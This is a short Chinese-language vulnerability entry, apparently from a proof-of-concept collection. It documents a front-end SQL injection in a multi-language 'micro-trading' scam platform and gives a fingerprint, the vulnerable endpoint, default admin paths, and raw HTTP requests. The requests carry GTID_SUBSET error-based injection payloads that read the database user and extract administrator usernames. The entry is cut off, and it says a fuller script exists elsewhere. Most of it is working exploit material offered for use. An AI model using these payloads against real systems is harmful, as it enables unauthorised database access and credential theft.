# 八国语言微盘杀猪盘诈骗微盘存在前台SQL注入漏洞

- **系统**：八国语言微盘杀猪盘诈骗微盘　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"/static/wap/css/common.css"`
- **请求**：`POST /index/user/dorecharge HTTP/1.1`

**请求体 / payload**
```
默认后台: /akszadmin   /admin
Content-Length: 17
Content-Type: application/x-www-form-urlencoded
Cookie: think\_var=hk; s47696c33=mp6s4pmvbpa4nqluhbdr7d3pvc
Host: 192.168.140.128
type=GTID\_SUBSET(CONCAT((SELECT (USER()))),2235)\&money=1222
**跑出管理员账户：**
POST /index/user/dorecharge HTTP/1.1
Content-Length: 154
Content-Type: application/x-www-form-urlencoded
Cookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think\_var=hk
Host: 192.168.140.128
type=GTID\_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(username AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)\&money=1222
**跑出管理…（脚本共 950 字，完整版见原文）
```
- **预期**：200　|　—